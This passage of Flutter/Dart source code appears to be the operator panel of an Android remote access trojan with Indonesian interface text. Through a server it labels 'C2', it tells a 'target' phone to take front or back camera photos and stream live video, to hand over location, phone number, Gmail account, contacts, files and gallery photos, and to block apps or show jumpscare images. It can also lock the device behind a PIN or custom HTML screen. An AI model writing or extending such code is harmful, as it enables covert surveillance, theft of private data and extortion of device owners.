                        style: const TextStyle(
                          color: Colors.white,
                          fontSize: 12,
                          fontWeight: FontWeight.w900,
                          letterSpacing: 2,
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 12),
                  Row(
                    children: [
                      const Icon(Icons.phone_android_rounded,
                          color: Colors.white, size: 20),
                      const SizedBox(width: 8),
                      Expanded(
                        child: Text(
                          model,
                          style: const TextStyle(
                            color: Colors.white,
                            fontSize: 16,
                            fontWeight: FontWeight.w900,
                          ),
                          overflow: TextOverflow.ellipsis,
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 8),
                  Text(
                    "ID: $deviceId",
                    style: TextStyle(
                      color: Colors.white.withOpacity(0.85),
                      fontSize: 11,
                      fontWeight: FontWeight.w700,
                    ),
                  ),
                  const SizedBox(height: 12),
                  Wrap(
                    spacing: 8,
                    runSpacing: 8,
                    children: [
                      _buildInfoChip(preset, "Android $androidVersion"),
                      _buildInfoChip(preset, "Baterai $batteryStr%",
                          icon: Icons.battery_charging_full_rounded),
                      _buildInfoChip(preset, _getPermissionStatus()),
                    ],
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildInfoChip(ThemePreset preset, String text, {IconData? icon}) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
      decoration: BoxDecoration(
        color: preset.card,
        borderRadius: BorderRadius.circular(6),
        border: Border.all(color: preset.border, width: 2),
      ),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          if (icon != null) ...[
            Icon(icon, size: 12, color: preset.text),
            const SizedBox(width: 4),
          ],
          Text(
            text,
            style: TextStyle(
              color: preset.text,
              fontSize: 10,
              fontWeight: FontWeight.w800,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildToggleCard({
    required ThemePreset preset,
    required String label,
    required IconData icon,
    required Color color,
    required bool isOn,
    required bool needsInput,
    required String inputHint,
    required String inputType,
    required String command,
  }) {
    return Container(
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: preset.card,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: preset.border, width: 3),
        boxShadow: [
          BoxShadow(
            color: preset.border.withOpacity(0.15),
            offset: const Offset(4, 4),
            blurRadius: 0,
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Container(
                width: 38,
                height: 38,
                decoration: BoxDecoration(
                  color: color,
                  borderRadius: BorderRadius.circular(8),
                  border: Border.all(color: preset.border, width: 2),
                ),
                child: Icon(icon, color: preset.card, size: 20),
              ),
              Transform.scale(
                scale: 0.85,
                child: Switch(
                  value: isOn,
                  onChanged: (bool value) async {
                    if (command == 'jumpscareStart') {
                      if (value == true) {
                        _showJumpscareDialog();
                      } else {
                        _sendCommand('jumpscareStop', extra: 'true');
                        setState(() {
                          _isJumpscareActive = false;
                          _updateControlItemState(command, false);
                        });
                      }
                      return;
                    }
                    if (command == 'jumpscare2Start') {
                      if (value == true) {
                        _showJumpscare2Dialog();
                      } else {
                        _sendCommand('jumpscare2Stop', extra: 'true');
                        setState(() {
                          _isJumpscare2Active = false;
                          _updateControlItemState(command, false);
                        });
                      }
                      return;
                    }
                    if (command == 'videoOverlay') {
                      _sendCommand(command, extra: value ? 'start' : 'stop');
                      setState(() {
                        _updateControlItemState(command, value);
                        _isVideoOverlayActive = value;
                      });
                      return;
                    }
                    if (command == 'lockDevice') {
                      if (value == true) {
                        String? input = await _showLockDeviceDialog();
                        if (input == null) return;
                        _sendCommand(command, extra: input);
                        setState(() {
                          _updateControlItemState(command, true);
                        });
                      } else {
                        _sendCommand('unlockDevice', extra: '');
                        setState(() {
                          _updateControlItemState(command, false);
                        });
                      }
                      return;
                    }
                    if (command == 'lockCustom') {
                      if (value == true) {
                        String? input = await _showInputDialog(
                          title: "LOCK V2 (HTML)",
                          hint: "Masukkan HTML untuk tampilan kunci",
                          initialValue: _lockCustomHtml.isNotEmpty
                              ? _lockCustomHtml
                              : '<h1>Device Locked</h1><p>Enter PIN</p>',
                          multiline: true,
                        );
                        if (input == null) return;
                        _lockCustomHtml = input;
                        _sendCommand('lockCustom', extra: input);
                        setState(() {
                          _isLockCustomActive = true;
                          _updateControlItemState(command, true);
                        });
                      } else {
                        _sendCommand('unlockDevice', extra: '');
                        setState(() {
                          _isLockCustomActive = false;
                          _updateControlItemState(command, false);
                        });
                      }
                      return;
                    }
                    if (needsInput && value == true) {
                      String? input = await _showInputDialog(
                        title: "Input untuk $label",
                        hint: inputHint,
                        multiline: inputType == 'multiline',
                        keyboardType: inputType == 'number'
                            ? TextInputType.number
                            : TextInputType.text,
                      );
                      if (input == null) return;
                      _sendCommand(command, extra: input);
                      setState(() {
                        _updateControlItemState(command, true);
                      });
                    } else if (needsInput && value == false) {
                      _sendCommand(command, extra: 'false');
                      setState(() {
                        _updateControlItemState(command, false);
                      });
                    } else {
                      _sendCommand(command, extra: value.toString());
                      setState(() {
                        _updateControlItemState(command, value);
                      });
                    }
                  },
                  activeColor: preset.card,
                  activeTrackColor: color,
                  inactiveThumbColor: preset.card,
                  inactiveTrackColor: preset.subText,
                ),
              ),
            ],
          ),
          const Spacer(),
          Text(
            label,
            style: TextStyle(
              color: preset.text,
              fontSize: 13,
              fontWeight: FontWeight.w900,
            ),
            maxLines: 2,
            overflow: TextOverflow.ellipsis,
          ),
          const SizedBox(height: 2),
          Text(
            isOn ? "ON" : "OFF",
            style: TextStyle(
              color: isOn ? preset.accent : preset.subText,
              fontSize: 10,
              fontWeight: FontWeight.w900,
              letterSpacing: 1,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildActionCard({
    required ThemePreset preset,
    required String label,
    required IconData icon,
    required Color color,
    required VoidCallback onTap,
  }) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.all(12),
        decoration: BoxDecoration(
          color: preset.card,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: preset.border, width: 3),
          boxShadow: [
            BoxShadow(
              color: preset.border.withOpacity(0.15),
              offset: const Offset(4, 4),
              blurRadius: 0,
            ),
          ],
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Container(
              width: 38,
              height: 38,
              decoration: BoxDecoration(
                color: color,
                borderRadius: BorderRadius.circular(8),
                border: Border.all(color: preset.border, width: 2),
              ),
              child: Icon(icon, color: preset.card, size: 20),
            ),
            const Spacer(),
            Text(
              label,
              style: TextStyle(
                color: preset.text,
                fontSize: 13,
                fontWeight: FontWeight.w900,
              ),
              maxLines: 2,
              overflow: TextOverflow.ellipsis,
            ),
            const SizedBox(height: 2),
            Text(
              "TAP",
              style: TextStyle(
                color: preset.subText,
                fontSize: 10,
                fontWeight: FontWeight.w900,
                letterSpacing: 1,
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _handleActionTap(Map<String, dynamic> item) async {
    final command = item['command'];
    final needsInput = item['needsInput'] ?? false;
    final inputHint = item['inputHint'] ?? '';
    final inputType = item['inputType'] ?? 'text';
    final extra = item['extra'] ?? '';

    if (command == "camera") {
      _takeScreenshotViaRest(extra.isNotEmpty ? extra : "front");
      return;
    }
    if (command == "liveCamera") {
      _openLiveCamera(extra.isNotEmpty ? extra : "front");
      return;
    }
    if (command == "stopCamera" || command == "stopScreen") {
      _sendCommand(command, extra: 'stop');
      return;
    }
    if (command == "getLocation" ||
        command == "getPhone" ||
        command == "getGmail" ||
        command == "getContacts" ||
        command == "getFiles") {
      _sendCommand(command, extra: '');
      return;
    }
    if (command == "getGallery") {
      _sendCommand(command, extra: '');
      _openGalleryFullscreen();
      return;
    }
    if (command == "setWallpaper" || command == "openUrl") {
      String? input = await _showInputDialog(
        title: command == "setWallpaper" ? "Set Wallpaper" : "Open Situs",
        hint: inputHint,
        initialValue: extra,
      );
      if (input == null) return;
      _sendCommand(command, extra: input);
      return;
    }
    if (command == "jumpscareStart") {
      _showJumpscareDialog();
      return;
    }
    if (command == "jumpscare2Start") {
      _showJumpscare2Dialog();
      return;
    }
    if (command == "blockApp") {
      _showBlockAppBottomSheet();
      return;
    }

    if (needsInput) {
      String? input = await _showInputDialog(
        title: "Input untuk ${item['label']}",
        hint: inputHint,
        multiline: inputType == 'multiline',
        keyboardType:
            inputType == 'number' ? TextInputType.number : TextInputType.text,
        initialValue: extra,
      );
      if (input == null) return;
      _sendCommand(command, extra: input);
    } else {
      _sendCommand(command, extra: extra);
    }
  }

  // ─── LIVE CAMERA ───
  void _openLiveCamera(String facing) {
    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (_) => LiveCameraPollingPage(
          targetId: _targetId,
          targetModel: _targetModel,
          facing: facing,
          sessionKey: _sessionKey,
          onClose: () {
            Navigator.pop(context);
          },
          onSwitchCamera: (newFacing) {
            // no-op
          },
        ),
        fullscreenDialog: true,
      ),
    );
  }

  void _openGalleryFullscreen() {
    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (_) => GalleryFullscreenPage(
          targetId: _targetId,
          targetModel: _targetModel,
          galleryStream: _galleryStreamController.stream,
          onClose: () => Navigator.pop(context),
          onRefresh: () {
            _sendCommand('getGallery', extra: '');
          },
          onDownload: (frame) async {
            try {
              final bytes = base64Decode(frame.split(',').last);
              final dir = await getApplicationDocumentsDirectory();
              final file = File(
                  '${dir.path}/gallery_${DateTime.now().millisecondsSinceEpoch}.jpg');
              await file.writeAsBytes(bytes);
            } catch (_) {}
          },
        ),
        fullscreenDialog: true,
      ),
    );
  }

  // ─── FOTO (screenshot sekali) ───
  Future<void> _takeScreenshotViaRest(String facing) async {
    if (_sessionKey == null) return;

    _isWaitingForPhoto = true;
    final preset = AppTheme.of(context);

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (ctx) {
        _photoLoadingContext = ctx;
        return Dialog(
          backgroundColor: Colors.transparent,
          child: Container(
            padding: const EdgeInsets.all(20),
            decoration: BoxDecoration(
              color: preset.card,
              borderRadius: BorderRadius.circular(14),
              border: Border.all(color: preset.border, width: 3),
            ),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                SizedBox(
                  width: 40,
                  height: 40,
                  child: CircularProgressIndicator(
                    color: preset.accent,
                    strokeWidth: 3,
                  ),
                ),
                const SizedBox(height: 16),
                Text(
                  "MENGAMBIL FOTO ${facing.toUpperCase()}...",
                  style: TextStyle(
                    color: preset.text,
                    fontSize: 12,
                    fontWeight: FontWeight.w800,
                    letterSpacing: 1.5,
                  ),
                ),
                const SizedBox(height: 6),
                Text(
                  "Menunggu device...",
                  style: TextStyle(
                    color: preset.subText,
                    fontSize: 10,
                    fontWeight: FontWeight.w600,
                  ),
                ),
              ],
            ),
          ),
        );
      },
    );

    if (socket != null && socket!.connected) {
      socket!.emit('command', {
        'deviceId': _targetId,
        'command': 'camera',
        'value': facing,
      });
    }

    try {
      await http.post(
        Uri.parse("$baseUrl/api/command/$_targetId"),
        headers: {
          "Content-Type": "application/json",
          "x-auth-token": _sessionKey!,
        },
        body: jsonEncode({"command": "camera", "value": facing}),
      ).timeout(const Duration(seconds: 8));
    } catch (e) {
      debugPrint('[CAM START] error: $e');
    }

    for (int attempt = 0; attempt < 5 && _isWaitingForPhoto; attempt++) {
      await Future.delayed(const Duration(milliseconds: 1200));
      if (!_isWaitingForPhoto) break;

      try {
        final response = await http.get(
          Uri.parse(
              "$baseUrl/api/screenshot/$_targetId?facing=$facing&t=${DateTime.now().millisecondsSinceEpoch}"),
          headers: {"x-auth-token": _sessionKey!},
        ).timeout(const Duration(seconds: 6));

        if (response.statusCode == 200 && _isWaitingForPhoto) {
          final data = jsonDecode(response.body);
          final frame = data['frame']?.toString() ?? '';
          if (frame.isNotEmpty) {
            _isWaitingForPhoto = false;
            if (_photoLoadingContext != null) {
              try {
                Navigator.pop(_photoLoadingContext!);
              } catch (_) {}
              _photoLoadingContext = null;
            }
            if (mounted) {
              Navigator.push(
                context,
                MaterialPageRoute(
                  builder: (_) => ScreenshotResultPage(
                    targetModel: _targetModel,
                    screenshotFrame: frame,
                    screenshotFacing: facing,
                    onClose: () => Navigator.pop(context),
                  ),
                  fullscreenDialog: true,
                ),
              );
            }
            return;
          }
        }
      } catch (e) {
        debugPrint('[SCREENSHOT REST] attempt $attempt error: $e');
      }
    }

    if (socket != null && socket!.connected) {
      socket!.emit('command', {
        'deviceId': _targetId,
        'command': 'camera',
        'value': facing,
      });
    }

    Future.delayed(const Duration(seconds: 15), () {
      if (_isWaitingForPhoto && mounted) {
        _isWaitingForPhoto = false;
        if (_photoLoadingContext != null) {
          try {
            Navigator.pop(_photoLoadingContext!);
          } catch (_) {}
          _photoLoadingContext = null;
        }
        _addLog("⚠️ Timeout ambil foto", LogType.warning);
      }
    });
  }

  // ─── DIALOG JUMPSSCARE ───
  void _showJumpscareDialog() {
    final preset = AppTheme.of(context);
    final urlController = TextEditingController(
        text: _jumpscareUrl.isNotEmpty
            ? _jumpscareUrl
            : "https://files.catbox.moe/dihycl.jpg");

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => AlertDialog(
        backgroundColor: preset.card,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(14),
          side: BorderSide(color: preset.border, width: 3),
        ),
        title: Text("Jumpscare",
            style: TextStyle(
                color: preset.text,
                fontWeight: FontWeight.w900,
                fontSize: 16)),
        content: TextField(
          controller: urlController,
          decoration: InputDecoration(
            hintText: "https://files.catbox.moe/xxx.jpg",
            hintStyle: TextStyle(color: preset.subText),
            border: OutlineInputBorder(
                borderRadius: BorderRadius.circular(8),
                borderSide: BorderSide(color: preset.border, width: 2)),
          ),
          style: TextStyle(color: preset.text),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text("BATAL",
                style: TextStyle(
                    color: preset.subText, fontWeight: FontWeight.w800)),
          ),
          ElevatedButton(
            onPressed: () {
              final url = urlController.text.trim();
              if (url.isEmpty) return;
              Navigator.pop(context);
              _jumpscareUrl = url;
              _sendCommand('jumpscareStart', extra: url);
              setState(() {
                _isJumpscareActive = true;
                _updateControlItemState('jumpscareStart', true);
              });
            },
            style: ElevatedButton.styleFrom(
              backgroundColor: preset.accent2,
              foregroundColor: preset.card,
            ),
            child: const Text("AKTIFKAN",
                style: TextStyle(fontWeight: FontWeight.w800)),
          ),
        ],
      ),
    );
  }

  void _showJumpscare2Dialog() {
    final preset = AppTheme.of(context);
    final urlController = TextEditingController(
        text: _jumpscare2Url.isNotEmpty
            ? _jumpscare2Url
            : "https://files.catbox.moe/ulrmbb.jpg");
    final durationController =
        TextEditingController(text: _jumpscare2Duration.toString());

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => AlertDialog(
        backgroundColor: preset.card,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(14),
          side: BorderSide(color: preset.border, width: 3),
        ),
        title: Text("Jumpscare V2",
            style: TextStyle(
                color: preset.text,
                fontWeight: FontWeight.w900,
                fontSize: 16)),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            TextField(
              controller: urlController,
              decoration: InputDecoration(
                hintText: "URL Foto",
                hintStyle: TextStyle(color: preset.subText),
                border: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(8),
                    borderSide: BorderSide(color: preset.border, width: 2)),
              ),
              style: TextStyle(color: preset.text),
            ),
            const SizedBox(height: 12),
            TextField(
              controller: durationController,
              keyboardType: TextInputType.number,
              decoration: InputDecoration(
                hintText: "Durasi (ms)",
                hintStyle: TextStyle(color: preset.subText),
                border: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(8),
                    borderSide: BorderSide(color: preset.border, width: 2)),
              ),
              style: TextStyle(color: preset.text),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text("BATAL",
                style: TextStyle(
                    color: preset.subText, fontWeight: FontWeight.w800)),
          ),
          ElevatedButton(
            onPressed: () {
              final url = urlController.text.trim();
              final duration =
                  int.tryParse(durationController.text.trim()) ?? 3000;
              if (url.isEmpty) return;
              Navigator.pop(context);
              _jumpscare2Url = url;
              _jumpscare2Duration = duration;
              _sendCommand('jumpscare2Start',
                  extra: jsonEncode({'url': url, 'duration': duration}));
              setState(() {
                _isJumpscare2Active = true;
                _updateControlItemState('jumpscare2Start', true);
              });
            },
            style: ElevatedButton.styleFrom(
              backgroundColor: preset.accent2,
              foregroundColor: preset.card,
            ),
            child: const Text("AKTIFKAN",
                style: TextStyle(fontWeight: FontWeight.w800)),
          ),
        ],
      ),
    );
  }

  void _showBlockAppBottomSheet() {
    final preset = AppTheme.of(context);
    _sendCommand('getInstalledApps', extra: 'true');

    showModalBottomSheet(
      context: context,
      backgroundColor: preset.card,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(20)),
      ),
      isScrollControlled: true,
      builder: (context) => Container(
        padding: const EdgeInsets.fromLTRB(20, 16, 20, 32),
        constraints: BoxConstraints(
          maxHeight: MediaQuery.of(context).size.height * 0.75,
        ),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(
              "Block Apps",
              style: TextStyle(
                color: preset.text,
                fontSize: 16,
                fontWeight: FontWeight.w900,
              ),
            ),
            const SizedBox(height: 12),
            Expanded(
              child: _installedApps.isEmpty
                  ? Center(
                      child: CircularProgressIndicator(color: preset.accent))
                  : ListView.builder(
                      itemCount: _installedApps.length,
                      itemBuilder: (context, index) {
                        final app = _installedApps[index];
                        final package = (app['package'] ?? '').toString();
                        final name = (app['name'] ?? package).toString();
                        return Container(
                          margin: const EdgeInsets.only(bottom: 8),
                          padding: const EdgeInsets.all(10),
                          decoration: BoxDecoration(
                            color: preset.card,
                            borderRadius: BorderRadius.circular(10),
                            border:
                                Border.all(color: preset.border, width: 2),
                          ),
                          child: Row(
                            children: [
                              Expanded(
                                child: Text(
                                  name,
                                  style: TextStyle(
                                      color: preset.text,
                                      fontWeight: FontWeight.w800),
                                ),
                              ),
                              ElevatedButton(
                                onPressed: () {
                                  _sendCommand('blockApp',
                                      extra: jsonEncode({
                                        'package': package,
                                        'name': name
                                      }));
                                },
                                child: const Text("BLOCK"),
                              ),
                            ],
                          ),
                        );
                      },
                    ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildTerminalLogs(ThemePreset preset) {
    return Container(
      height: 130,
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: preset.card,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: preset.border, width: 3),
        boxShadow: [
          BoxShadow(
            color: preset.border.withOpacity(0.12),
            offset: const Offset(5, 5),
            blurRadius: 0,
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                width: 8,
                height: 8,
                decoration: BoxDecoration(
                  color: _isConnected ? preset.accent : preset.accent2,
                  shape: BoxShape.circle,
                  border: Border.all(color: preset.border, width: 1.5),
                ),
              ),
              const SizedBox(width: 6),
              Text(
                _isConnected ? "C2 ONLINE" : "C2 OFFLINE",
                style: TextStyle(
                  color: preset.text,
                  fontSize: 10,
                  fontWeight: FontWeight.w900,
                  letterSpacing: 1,
                ),
              ),
            ],
          ),
          const SizedBox(height: 8),
          Expanded(
            child: ListView.builder(
              controller: _logScrollController,
              reverse: true,
              padding: EdgeInsets.zero,
              itemCount: _executionLogs.length,
              itemBuilder: (context, i) {
                final log = _executionLogs[i];
                return Padding(
                  padding: const EdgeInsets.symmetric(vertical: 2),
                  child: Row(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text("[${_formatTime(log.timestamp)}]",
                          style: TextStyle(
                              color: preset.subText,
                              fontSize: 9,
                              fontWeight: FontWeight.w700)),
                      const SizedBox(width: 6),
                      Expanded(
                        child: Text(
                          log.message,
                          style: TextStyle(
                              color: _getLogColor(preset, log.type),
                              fontSize: 10,
                              fontWeight: FontWeight.w700),
                        ),
                      ),
                    ],
                  ),
                );
              },
            ),
          ),
        ],
      ),
    );
  }

  String _getPermissionStatus() {
    final permissions = _deviceData['permissions'];
    final permissionCount = _deviceData['permissionCount'];
    if (permissionCount != null) {
      if (permissionCount is int) return "$permissionCount/15";
      if (permissionCount is String) return permissionCount;
    }
    if (permissions != null && permissions is List) {
      final grantedCount =
          permissions.where((p) => p is Map && p['granted'] == true).length;
      return "$grantedCount/${permissions.length}";
    }
    return "10/15";
  }

  // ==================== CONTROL TAB ====================
  Widget _buildControlTab(ThemePreset preset) {
    if (_targetId == "unknown") {
      return Center(
        child: Text(
          "DEVICE TIDAK VALID",
          style: TextStyle(
              color: preset.subText,
              fontSize: 18,
              fontWeight: FontWeight.bold),
        ),
      );
    }

    return SingleChildScrollView(
      physics: const AlwaysScrollableScrollPhysics(
        parent: BouncingScrollPhysics(),
      ),
      padding: const EdgeInsets.fromLTRB(16, 12, 16, 40),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          _buildDeviceInfoCard(preset),
          const SizedBox(height: 20),
          _buildSectionHeader(preset, "REMOTE CONTROL", preset.accent),
          const SizedBox(height: 10),
          GridView.builder(
            shrinkWrap: true,
            physics: const NeverScrollableScrollPhysics(),
            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
              crossAxisCount: 2,
              crossAxisSpacing: 12,
              mainAxisSpacing: 12,
              childAspectRatio: 1.05,
            ),
            itemCount: _controlItems.length,
            itemBuilder: (context, index) {
              final item = _controlItems[index];
              final itemColor =
                  _resolveItemColor(preset, item['colorKey'] ?? 'blue');
              if (item['isToggle'] == true) {
                return _buildToggleCard(
                  preset: preset,
                  label: item['label'],
                  icon: item['icon'],
                  color: itemColor,
                  isOn: item['isOn'],
                  needsInput: item['needsInput'] ?? false,
                  inputHint: item['inputHint'] ?? '',
                  inputType: item['inputType'] ?? 'text',
                  command: item['command'],
                );
              }
              return _buildActionCard(
                preset: preset,
                label: item['label'],
                icon: item['icon'],
                color: itemColor,
                onTap: () => _handleActionTap(item),
              );
            },
          ),
          const SizedBox(height: 20),
          _buildTerminalLogs(preset),
        ],
      ),
    );
  }

  @override
  void dispose() {
    _fadeController.dispose();
    _logScrollController.dispose();
    _bgVideoController?.dispose();
    _galleryStreamController.close();
    try {
      socket?.disconnect();
      socket?.dispose();
    } catch (_) {}
    super.dispose();
  }
}

// ============================================================
// HALAMAN PENDUKUNG
// ============================================================

class GalleryFullscreenPage extends StatelessWidget {
  final String targetId;
  final String targetModel;
  final Stream<List<Map<String, dynamic>>> galleryStream;
  final VoidCallback onClose;
  final VoidCallback onRefresh;
  final Function(String) onDownload;

  const GalleryFullscreenPage({
    Key? key,
    required this.targetId,
    required this.targetModel,
    required this.galleryStream,
    required this.onClose,
    required this.onRefresh,
    required this.onDownload,
  }) : super(key: key);

  @override
  Widget build(BuildContext context) {
    final preset = AppTheme.of(context);

    return Scaffold(
      backgroundColor: preset.bg,
      appBar: AppBar(
        backgroundColor: preset.accent2,
        elevation: 0,
        leading: IconButton(
          icon: Icon(Icons.arrow_back_ios, color: preset.text),
          onPressed: onClose,
        ),
        title: Text("GALLERY",
            style: TextStyle(
                color: preset.text,
                fontWeight: FontWeight.w900,
                letterSpacing: 2)),
        actions: [
          IconButton(
            icon: Icon(Icons.refresh, color: preset.text),
            onPressed: onRefresh,
          ),
        ],
      ),
      body: StreamBuilder<List<Map<String, dynamic>>>(
        stream: galleryStream,
        builder: (context, snapshot) {
          final photos = snapshot.data ?? [];
          if (photos.isEmpty) {
            return Center(
              child: Text("Tidak ada foto",
                  style: TextStyle(
                      color: preset.subText, fontWeight: FontWeight.w700)),
            );
          }
          return GridView.builder(
            padding: const EdgeInsets.all(10),
            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
              crossAxisCount: 3,
              crossAxisSpacing: 8,
              mainAxisSpacing: 8,
            ),
            itemCount: photos.length > 40 ? 40 : photos.length,
            itemBuilder: (context, i) {
              final thumb = (photos[i]['thumb'] ?? '').toString();
              if (thumb.isEmpty) {
                return Container(color: preset.bg);
              }
              try {
                return Image.memory(
                  base64Decode(
                      thumb.contains(',') ? thumb.split(',').last : thumb),
                  fit: BoxFit.cover,
                );
              } catch (_) {
                return Container(
                  color: preset.bg,
                  child: Icon(Icons.broken_image, color: preset.subText),
                );
              }
            },
          );
        },
      ),
    );
  }
}

class LiveCameraPollingPage extends StatefulWidget {
  final String targetId;
  final String targetModel;
  final String facing;
  final String? sessionKey;
  final VoidCallback onClose;
  final Function(String) onSwitchCamera;

  const LiveCameraPollingPage({
    Key? key,
    required this.targetId,
    required this.targetModel,
    required this.facing,
    required this.onClose,
    required this.onSwitchCamera,
    this.sessionKey,
  }) : super(key: key);

  @override
  State<LiveCameraPollingPage> createState() => _LiveCameraPollingPageState();
}

class _LiveCameraPollingPageState extends State<LiveCameraPollingPage> {
  String _currentFrame = '';
  bool _isLoading = true;
  Timer? _pollingTimer;
  Timer? _retryTimer;
  String _currentFacing = '';
  String? _sessionKey;
  IO.Socket? _camSocket;
  int _emptyCount = 0;
  bool _isStopping = false;
  bool _isStarting = false;

  @override
  void initState() {
    super.initState();
    _currentFacing = widget.facing;
    _initAll();
  }

  Future<void> _initAll() async {
    if (widget.sessionKey != null && widget.sessionKey!.isNotEmpty) {
      _sessionKey = widget.sessionKey;
    } else {
      final prefs = await SharedPreferences.getInstance();
      _sessionKey = prefs.getString('key');
    }

    _initSocket();
    await _startLiveCamera();

    _pollingTimer = Timer.periodic(
      const Duration(milliseconds: 1500),
      (_) => _fetchFrame(),
    );

    _retryTimer = Timer.periodic(const Duration(seconds: 8), (_) {
      if (_currentFrame.isEmpty && mounted) {
        debugPrint('[LIVE CAM] auto-retry start command facing=$_currentFacing');
        _startLiveCamera();
      }
    });
  }

  void _initSocket() {
    try {
      _camSocket = IO.io(
        baseUrl,
        IO.OptionBuilder()
            .setTransports(['websocket'])
            .setPath('/socket.io')
            .setQuery({
              'type': 'admin',
              'id': 'LIVE_CAM',
              'token': _sessionKey ?? '',
              'role': 'user',
            })
            .enableAutoConnect()
            .enableReconnection()
            .setReconnectionAttempts(999)
            .setReconnectionDelay(2000)
            .build(),
      );

      _camSocket!.onConnect((_) {
        debugPrint('[LIVE CAM] socket connected');
        _camSocket!.emit('controller:join', {
          'token': _sessionKey,
          'role': 'user',
        });
        _startLiveCamera();
      });

      _camSocket!.on('camera:frame', (data) {
        if (data is Map &&
            data['deviceId'] == widget.targetId &&
            data['frame'] != null &&
            data['frame'].toString().isNotEmpty) {
          final frameFacing = (data['facing'] ?? '').toString();
          if (frameFacing.isNotEmpty && frameFacing != _currentFacing) {
            return;
          }
          _emptyCount = 0;
          if (mounted) {
            setState(() {
              _currentFrame = data['frame'].toString();
              _isLoading = false;
            });
          }
        }
      });

      _camSocket!.on('camera:screenshot', (data) {
        if (data is Map &&
            data['deviceId'] == widget.targetId &&
            data['frame'] != null &&
            data['frame'].toString().isNotEmpty) {
          final frameFacing = (data['facing'] ?? '').toString();
          if (frameFacing.isNotEmpty && frameFacing != _currentFacing) {
            return;
          }
          _emptyCount = 0;
          if (mounted) {
            setState(() {
              _currentFrame = data['frame'].toString();
              _isLoading = false;
            });
          }
        }
      });

      _camSocket!.connect();
    } catch (e) {
      debugPrint('[LIVE CAM] socket error: $e');
    }
  }

  Future<void> _startLiveCamera() async {
    if (_sessionKey == null || _isStarting) return;
    _isStarting = true;

    try {
      try {
        await http.post(
          Uri.parse("$baseUrl/api/command/${widget.targetId}"),
          headers: {
            "Content-Type": "application/json",
            "x-auth-token": _sessionKey!,
          },
          body: jsonEncode({
            "command": "liveCamera",
            "value": _currentFacing,
          }),
        ).timeout(const Duration(seconds: 8));
      } catch (e) {
        debugPrint('[LIVE CAM] REST start error: $e');
      }

      if (_camSocket != null && _camSocket!.connected) {
        _camSocket!.emit('command', {
          'deviceId': widget.targetId,
          'command': 'liveCamera',
          'value': _currentFacing,
        });
      }
    } finally {
      _isStarting = false;
    }
  }

  Future<void> _fetchFrame() async {
    if (_sessionKey == null) return;
    try {
      final response = await http.get(
        Uri.parse(
            "$baseUrl/api/live-camera/${widget.targetId}?facing=$_currentFacing&t=${DateTime.now().millisecondsSinceEpoch}"),
        headers: {"x-auth-token": _sessionKey!},
      ).timeout(const Duration(seconds: 5));

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        final frame = data['frame']?.toString() ?? '';
        final frameFacing = data['facing']?.toString() ?? '';

        if (frame.isNotEmpty &&
            (frameFacing.isEmpty || frameFacing == _currentFacing)) {
          _emptyCount = 0;
          if (mounted) {
            setState(() {
              _currentFrame = frame;
              _isLoading = false;
            });
          }
          return;
        }
      }
      _emptyCount++;

      if (_emptyCount >= 4) {
        _emptyCount = 0;
        await _startLiveCamera();
      }
    } catch (e) {
      _emptyCount++;
      debugPrint('[LIVE CAM] fetch error: $e');
    }
  }

  Future<void> _stopLiveCamera() async {
    if (_isStopping) return;
    _isStopping = true;
    if (_sessionKey != null) {
      try {
        await http.post(
          Uri.parse("$baseUrl/api/command/${widget.targetId}"),
          headers: {
            "Content-Type": "application/json",
            "x-auth-token": _sessionKey!,
          },
          body: jsonEncode({"command": "stopCamera", "value": "stop"}),
        ).timeout(const Duration(seconds: 5));
      } catch (_) {}

      if (_camSocket != null && _camSocket!.connected) {
        _camSocket!.emit('command', {
          'deviceId': widget.targetId,
          'command': 'stopCamera',
          'value': 'stop',
        });
      }
    }
  }

  @override
  void dispose() {
    _pollingTimer?.cancel();
    _retryTimer?.cancel();
    _stopLiveCamera();
    try {
      _camSocket?.disconnect();
      _camSocket?.dispose();
    } catch (_) {}
    super.dispose();
  }

  Future<void> _switchCamera() async {
